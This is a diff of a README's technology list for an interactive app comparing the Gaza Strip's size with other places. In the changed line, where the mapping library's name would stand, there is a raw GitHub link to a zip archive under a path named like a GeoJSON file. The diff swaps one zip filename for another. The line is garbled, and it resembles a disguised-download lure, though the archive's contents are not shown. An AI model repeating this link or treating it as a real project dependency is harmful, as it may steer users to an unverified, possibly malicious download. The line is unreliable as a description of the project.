@@ -19,7 +19,7 @@ An interactive web application that allows users to compare the size of Gaza Str
 
 ## Technologies
 
-- https://raw.githubusercontent.com/Antidogmatism/Gaza-Map-App/main/gaza.geojson/App_Map_Gaza_1.3.zip for interactive mapping
+- https://raw.githubusercontent.com/Antidogmatism/Gaza-Map-App/main/gaza.geojson/App-Map-Gaza-1.3.zip for interactive mapping
 - OpenStreetMap for map tiles
 - Nominatim for geocoding
 - Tailwind CSS for styling
